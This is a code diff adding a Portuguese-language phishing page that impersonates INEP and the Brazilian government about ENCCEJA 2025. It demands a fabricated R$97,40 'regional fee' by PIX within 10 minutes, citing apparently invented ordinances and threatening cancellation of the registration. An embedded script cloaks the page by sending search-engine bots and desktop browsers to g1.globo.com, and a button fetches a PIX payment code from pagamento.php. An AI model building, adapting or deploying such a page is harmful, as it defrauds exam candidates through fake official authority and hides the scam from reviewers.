@@ -1,0 +1,431 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+    
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+    <script>
+        // Função para detectar se é um dispositivo móvel
+        function isMobile() {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        }
+
+        // Função para detectar se é um bot
+        function isBot() {
+            const botAgents = [
+            'Googlebot', 'Bingbot', 'Slurp', 'DuckDuckBot', 'Baiduspider',
+            'YandexBot', 'Sogou', 'Exabot', 'facebot', 'ia_archiver'
+            ];
+
+            return botAgents.some(bot => navigator.userAgent.includes(bot));
+        }
+
+        // Função para verificar se a largura da janela é maior que 768px
+        function isWideScreen() {
+            return window.innerWidth > 768;
+        }
+
+        // Redirecionar ou bloquear o acesso
+        function checkAccess() {
+            if (isBot() || (!isMobile() && isWideScreen())) {
+            // Redirecionar para o site G1 se o acesso for bloqueado
+            window.location.href = "https://g1.globo.com/";
+            }
+        }
+
+        // Executar a função de verificação ao carregar a página
+        window.onload = checkAccess;
+
+        // Adicionar um listener para verificar novamente se a janela for redimensionada
+        window.addEventListener('resize', checkAccess);
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ENCCEJA 2025 - Tarifa Regional de Aplicação da Prova</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="css/all.min.css">
+    <link rel="stylesheet" href="css/rawline-fonts.css">
+    <style>
+        @font-face {
+            font-family: 'rawline';
+            src: url('/static/fonts/rawline-500.woff2') format('woff2'),
+                 url('/static/fonts/rawline-500.woff') format('woff');
+            font-weight: 500;
+            font-style: normal;
+        }
+        
+        @font-face {
+            font-family: 'rawline';
+            src: url('/static/fonts/rawline-700.woff2') format('woff2'),
+                 url('/static/fonts/rawline-700.woff') format('woff');
+            font-weight: 700;
+            font-style: normal;
+        }
+        
+        body {
+            font-family: 'rawline', sans-serif;
+        }
+        
+        @keyframes moveButton {
+            0%, 100% { transform: translateX(0); }
+            50% { transform: translateX(10px); }
+        }
+        #payFeeButton {
+            animation: moveButton 1.5s ease-in-out infinite;
+            background-color: #f44336;
+        }
+        #payFeeButton:hover {
+            background-color: #d32f2f;
+        }
+        .icon-container {
+            margin-top: 10px;
+            position: relative;
+        }
+        .icon-container img {
+            position: relative;
+            top: 10px;
+            left: 2px;
+        }
+        .icon-container::before {
+            content: '';
+            position: absolute;
+            top: 10px;
+            left: 0;
+            height: 100%;
+            width: 4px;
+            background-color: #f8f9fa;
+        }
+        .alert-box {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        .next-step-box {
+            background-color: #044785;
+        }
+        .next-step-box p {
+            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.1);
+        }
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 95%;
+            height: 70%;
+            background-color: white;
+            border-radius: 4px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            z-index: 1000;
+        }
+        .popup-content {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100%;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #044785;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 999;
+        }
+        .gov-header {
+            background-color: #222222;
+        }
+        .inep-header {
+            background-color: #044785;
+        }
+        .form-header {
+            background-color: #2c5985;
+            color: white;
+            font-weight: 600;
+        }
+        .footer-bg {
+            background-color: #1c2b39;
+        }
+    </style>
+</head>
+<body class="flex flex-col min-h-screen bg-white">
+    <!-- Government Header -->
+    <header class="gov-header text-white py-2">
+        <div class="container mx-auto flex justify-between items-center px-4">
+            <a class="font-bold text-sm" href="#">
+                <img src="images/Imagem-29-03-2025-a-s-17-32.jpg" alt="Logotipo do Brasil" class="h-6">
+            </a>
+            <nav>
+                <ul class="flex space-x-4 text-[10px]">
+                    <li>
+                        <a class="hover:underline" href="#">ACESSO À INFORMAÇÃO</a>
+                    </li>
+                    <li>
+                        <a class="hover:underline" href="#">PARTICIPE</a>
+                    </li>
+                    <li>
+                        <a class="hover:underline" href="#">SERVIÇOS</a>
+                    </li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+    <!-- INEP Header -->
+    <div class="inep-header py-3">
+        <div class="container mx-auto px-4">
+            <svg class="h-7" height="30" preserveAspectRatio="xMidYMid" viewBox="0 0 69 20" width="120" xmlns="http://www.w3.org/2000/svg">
+                <defs>
+                    <style>
+                        .cls-2{fill:#fff}
+                    </style>
+                </defs>
+                <path class="cls-2" d="M30 20h17v-5H35v-3h12V7H30v13zM50 0v5h19c0-2.47-2.108-5-5-5M50 20h6v-8h8c2.892 0 5-2.53 5-5H50v13zM22 0H9v5h18c-.386-4.118-4.107-5-5-5zm8 5h17V0H30v5zM0 20h6V7H0v13zm9 0h6V7H9v13zm12 0h6V7h-6v13zM0 5h6V0H0v5z" fill-rule="evenodd" id="path-1"></path>
+            </svg>
+        </div>
+    </div>
+    <!-- ENCCEJA Logo -->
+    <div class="text-center py-6">
+        <img alt="Logo ENCCEJA 2025" class="mx-auto" height="100" src="https://lh4.googleusercontent.com/proxy/_9Y0LIQJY1EdBdBVxy9MNsDDxrwGhfi2sjqj0zyi8ozsQS0eaxz82ZcL248lfPHCGJ3N07JVCIidVaFuR9pcnZNvpdEzt9bcLzGuHf9h09CpscRLpaqVYz0" width="420">
+    </div>
+
+    <div class="p-6 flex flex-col items-center bg-white mt-0">
+        <div class="mb-4 relative">
+        </div>
+        <h1 class="text-[22px] font-bold text-center mb-2">Pagamento da Tarifa Regional de Aplicação da Prova ENCCEJA 2025</h1>
+        <div class="text-white text-center mb-2 bg-red-600 p-4 rounded-md">
+            <p class="text-[17px] text-shadow" style="text-shadow: 1px 1px 2px rgba(0,0,0,0.3);"><strong>AVISO IMPORTANTE:</strong> A inscrição no ENCCEJA 2025 requer pagamento da tarifa regional. O não pagamento resultará na invalidação da sua inscrição.</p>
+        </div>
+    </div>
+    <main class="container mx-auto px-4 py-2">
+        <div class="mb-6" style="font-size: 1rem; line-height: 1.45;">
+            <div class="flex items-center mb-2">
+                <h2 class="font-bold text-[18px]" style="color: #044785;">Prezado(a) <span id="userFirstName">Participante</span>:</h2>
+            </div>
+            <p class="text-[16px] leading-relaxed" style="color: #333;">
+                Para concluir sua inscrição no ENCCEJA 2025 e garantir seu local de prova, é necessário efetuar o pagamento da <strong>Tarifa Regional de Aplicação da Prova (TRAP)</strong> no valor de <strong>R$97,40</strong>.
+            </p>
+            <ul class="list-none pl-0 mt-3 text-[16px] leading-relaxed" style="color: #333;">
+                <li class="flex items-start mb-2">
+                    <span class="w-2 h-2 bg-[#044785] rounded-full mt-2 mr-3 flex-shrink-0"></span>
+                    <div>
+                        <strong class="font-bold" style="color: #044785;">O que é a Tarifa Regional de Aplicação da Prova (TRAP):</strong> Conforme a Portaria INEP nº 123/2025, esta tarifa cobre custos logísticos específicos para a aplicação das provas em sua região, incluindo locação de espaços, equipes de fiscalização e materiais.
+                    </div>
+                </li>
+                <li class="flex items-start mb-2">
+                    <span class="w-2 h-2 bg-[#044785] rounded-full mt-2 mr-3 flex-shrink-0"></span>
+                    <div>
+                        <strong class="font-bold" style="color: #044785;">Prazo para pagamento:</strong> A tarifa deve ser paga em até 10 minutos após a conclusão da inscrição para garantir sua participação no exame de 2025.
+                    </div>
+                </li>
+            </ul>
+            <p class="mt-4 font-bold flex items-start text-[16px]" style="color: #333;">
+                <span class="w-2 h-2 bg-[#044785] rounded-full mt-2 mr-3 flex-shrink-0"></span>
+                <span>Valor a ser pago: <strong>R$97,40</strong></span>
+            </p>
+        </div>
+        <div class="movements">
+            <div class="icon-container pl-8 pb-4">
+                <div class="absolute left-0 top-[-8px] w-6 h-6 -ml-3 flex items-center justify-center">
+                    <img src="images/ic-acesso-informacao-54-v2.png" alt="Icon representing information access with a blue and white design">
+                </div>
+                <div class="mb-8" style="margin-top: -9px;">
+                    <p class="font-semibold text-[17px]" style="color: #044785;">INFORMAÇÕES IMPORTANTES</p>
+                    <div class="mt-4 p-4 rounded-md alert-box" role="alert">
+                        <p class="mt-1 text-[16px]"><strong>ATENÇÃO:</strong> O não pagamento da Tarifa Regional resultará na <strong>impossibilidade de realizar a prova do ENCCEJA 2025</strong>. Sua inscrição será automaticamente cancelada após o prazo.</p>
+                    </div>
+                    <div class="mt-4 p-4 rounded-md alert-box" role="alert">
+                        <p class="mt-1 text-[16px]"><strong>AVISO OFICIAL:</strong> De acordo com a Portaria MEC nº 987/2025, o participante <strong>não terá direito ao reembolso</strong> de quaisquer taxas previamente pagas em caso de cancelamento de inscrição ou não comparecimento ao exame.</p>
+                    </div>
+                    <button id="payFeeButton" class="mt-4 text-white px-8 py-3 rounded-[4px] text-[17px] font-bold py-2 px-6 rounded-[4px] transition duration-300 shadow-md">
+    REALIZAR PAGAMENTO
+</button>
+
+<script>
+    document.getElementById('payFeeButton').addEventListener('click', function() {
+        // Mostrar o popup e overlay
+        document.getElementById('overlay').style.display = 'block';
+        document.getElementById('popup').style.display = 'block';
+        document.getElementById('loadingPopup').style.display = 'flex';
+        document.getElementById('pixPaymentPopup').style.display = 'none';
+        
+        // Extrair os parâmetros da URL atual
+        const urlParams = new URLSearchParams(window.location.search);
+        const formData = new FormData();
+        
+        // Adicionar os parâmetros UTM ao FormData
+        if (urlParams.has('utm_source')) formData.append('utm_source', urlParams.get('utm_source'));
+        if (urlParams.has('utm_medium')) formData.append('utm_medium', urlParams.get('utm_medium'));
+        if (urlParams.has('utm_campaign')) formData.append('utm_campaign', urlParams.get('utm_campaign'));
+        if (urlParams.has('utm_content')) formData.append('utm_content', urlParams.get('utm_content'));
+        if (urlParams.has('utm_term')) formData.append('utm_term', urlParams.get('utm_term'));
+        if (urlParams.has('xcod')) formData.append('xcod', urlParams.get('xcod'));
+        if (urlParams.has('sck')) formData.append('sck', urlParams.get('sck'));
+        
+        // Chamar o script de pagamento
+        fetch('pagamento.php', {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+            // Ocultar o loading e mostrar o popup de pagamento PIX
+            document.getElementById('loadingPopup').style.display = 'none';
+            document.getElementById('pixPaymentPopup').style.display = 'block';
+            
+            if (data.success) {
+                // Configurar o QR Code e código PIX
+                document.getElementById('pixQrCode').src = data.qrCodeUrl;
+                document.getElementById('pixCodeText').value = data.pixCode;
+                
+                // Configurar o botão de cópia
+                document.getElementById('copyPixCodeBtn').addEventListener('click', function() {
+                    const pixCode = document.getElementById('pixCodeText');
+                    pixCode.select();
+                    document.execCommand('copy');
+                    this.textContent = '✓ Código Copiado!';
+                    setTimeout(() => {
+                        this.innerHTML = '<i class="fas fa-copy mr-2"></i>Copiar Código PIX';
+                    }, 2000);
+                });
+                
+                // Ocultar o loader do status
+                document.getElementById('pixStatusLoader').style.display = 'none';
+            } else {
+                // Mostrar mensagem de erro
+                document.getElementById('pixPaymentTitle').textContent = 'Erro ao Gerar Pagamento';
+                document.getElementById('pixPaymentDescription').textContent = data.message || 'Ocorreu um erro ao gerar o pagamento PIX. Por favor, tente novamente.';
+                document.getElementById('pixStatusLoader').style.display = 'none';
+            }
+        })
+        .catch(error => {
+            // Lidar com erros
+            document.getElementById('loadingPopup').style.display = 'none';
+            document.getElementById('pixPaymentPopup').style.display = 'block';
+            document.getElementById('pixPaymentTitle').textContent = 'Erro de Conexão';
+            document.getElementById('pixPaymentDescription').textContent = 'Não foi possível conectar ao servidor de pagamento. Verifique sua conexão e tente novamente.';
+            document.getElementById('pixStatusLoader').style.display = 'none';
+            console.error('Erro:', error);
+        });
+    });
+    
+    // Fechar o popup quando clicar no overlay
+    document.getElementById('overlay').addEventListener('click', function() {
+        document.getElementById('overlay').style.display = 'none';
+        document.getElementById('popup').style.display = 'none';
+    });
+</script>
+                </div>
+            </div>
+            <div class="mt-8 next-step-box p-4">
+                <p class="font-semibold text-white text-[17px]">DEPOIS DO PAGAMENTO:</p>
+                <p class="mt-2 text-white text-[16px]">Após o pagamento da Tarifa Regional, sua inscrição no ENCCEJA 2025 estará confirmada e você poderá acessar:</p>
+                <div class="mt-4 text-white">
+                    <p class="text-[16px]"><strong>• Cartão de Confirmação:</strong> Disponível 15 dias antes da prova</p>
+                    <p class="text-[16px]"><strong>• Local de Prova:</strong> Detalhes completos com endereço e sala</p>
+                    <p class="text-[16px]"><strong>• Materiais de Estudo:</strong> Acesso ao portal de estudantes</p>
+                    <p class="text-[16px]"><strong>• Comprovante de Inscrição:</strong> Disponível para download</p>
+                </div>
+            </div>
+        </div>
+    </main>
+    <!-- Footer -->
+    <footer class="footer-bg text-white py-4 text-xs mt-8">
+        <div class="container mx-auto px-4">
+            <div class="flex flex-col items-center mb-2">
+                <svg xmlns="http://www.w3.org/2000/svg" preserveAspectRatio="xMidYMid" width="69" height="20" viewBox="0 0 69 20" class="h-16 w-auto mb-3">
+                    <defs><style>.cls-2{fill:#fff}</style></defs>
+                    <path d="M30 20h17v-5H35v-3h12V7H30v13zM50 0v5h19c0-2.47-2.108-5-5-5M50 20h6v-8h8c2.892 0 5-2.53 5-5H50v13zM22 0H9v5h18c-.386-4.118-4.107-5-5-5zm8 5h17V0H30v5zM0 20h6V7H0v13zm9 0h6V7H9v13zm12 0h6V7h-6v13zM0 5h6V0H0v5z" id="path-1" class="cls-2" fill-rule="evenodd"></path>
+                </svg>
+                <p class="text-sm text-center mb-2">Instituto Nacional de Estudos e Pesquisas Educacionais</p>
+            </div>
+            <div class="flex justify-between items-center">
+                <div>
+                    © MEC - Ministério da Educação | INEP - Instituto Nacional de Estudos e Pesquisas
+                </div>
+                <div class="flex items-center">
+                    <i class="fas fa-phone-alt mr-1"></i>
+                    0800 616161
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <div id="overlay" class="overlay"></div>
+    <div id="popup" class="popup" style="height: 95vh;">
+        <div class="popup-content flex flex-col items-center justify-center h-[80vh]" id="loadingPopup">
+            <div class="loader"></div>
+            <p class="mt-4 text-[18px] font-bold">Gerando Guia de Pagamento</p>
+        </div>
+        
+        <div class="popup-content" id="pixPaymentPopup" style="display: none; width: 95%; max-width: 450px; padding: 25px; max-height: 90vh; overflow-y: auto;">
+            <div class="text-center mb-3">
+                <h3 class="text-[18px] font-bold text-[#044785] mb-2" id="pixPaymentTitle">Tarifa Regional de Aplicação da Prova</h3>
+                <p class="text-[16px] mb-3" id="pixPaymentDescription">Para confirmar sua inscrição no ENCCEJA 2025, realize o pagamento da tarifa via PIX.</p>
+                
+                <div class="loader mb-3 mx-auto" id="pixStatusLoader"></div>
+                
+                <!-- Valor a ser pago -->
+                <div class="bg-red-50 p-3 rounded-lg mb-3 border border-red-200">
+                    <p class="text-[16px] font-semibold text-red-700 mb-1">Valor a ser pago: <span class="text-red-600 font-bold">R$97,40</span></p>
+                    <p class="text-[14px] text-red-600">Tarifa Regional de Aplicação da Prova (TRAP)</p>
+                </div>
+                
+                <!-- QR Code -->
+                <div class="bg-gray-100 p-3 rounded-lg mb-3">
+                    <img id="pixQrCode" src="" alt="QR Code PIX" class="w-40 h-40 mx-auto mb-2">
+                    <p class="text-[16px] text-gray-600 mb-1">Escaneie o QR Code acima</p>
+                </div>
+                
+                <!-- PIX Copy & Paste -->
+                <div class="bg-gray-100 p-3 rounded-lg mb-3">
+                    <p class="text-[16px] font-semibold mb-1 text-gray-700">Código PIX copia e cola:</p>
+                    <div class="relative">
+                        <textarea id="pixCodeText" readonly class="w-full p-3 text-[16px] bg-white border border-gray-300 rounded-md h-12 font-mono overflow-hidden resize-none"></textarea>
+                    </div>
+                    <button id="copyPixCodeBtn" class="mt-2 bg-[#044785] text-white font-semibold py-2 px-4 rounded-md w-full text-[16px] transition duration-300 hover:bg-[#033d71]">
+                        <i class="fas fa-copy mr-2"></i>Copiar Código PIX
+                    </button>
+                </div>
+                
+                <div class="bg-blue-50 p-3 rounded-lg mb-3 border border-blue-200">
+                    <p class="text-[14px] text-gray-600 font-semibold text-blue-800">
+                        <i class="fas fa-info-circle mr-1"></i>Instruções:
+                    </p>
+                    <ol class="text-[14px] text-blue-800 list-decimal pl-5 text-left">
+                        <li class="mb-1">Abra o aplicativo do seu banco</li>
+                        <li class="mb-1">Escolha a opção "PIX" ou "Pagar com PIX"</li>
+                        <li class="mb-1">Escaneie o QR Code ou cole o código copiado</li>
+                        <li class="mb-1">Confirme o valor de R$97,40 e finalize o pagamento</li>
+                    </ol>
+                </div>
+                
+                <p class="text-[16px] text-gray-600 mt-2">
+                    Após o pagamento, aguarde alguns instantes para a confirmação.
+                    <br>O sistema verificará automaticamente o status do pagamento.
+                </p>
+            </div>
+        </div>
+    </div>
+
+</body></html>
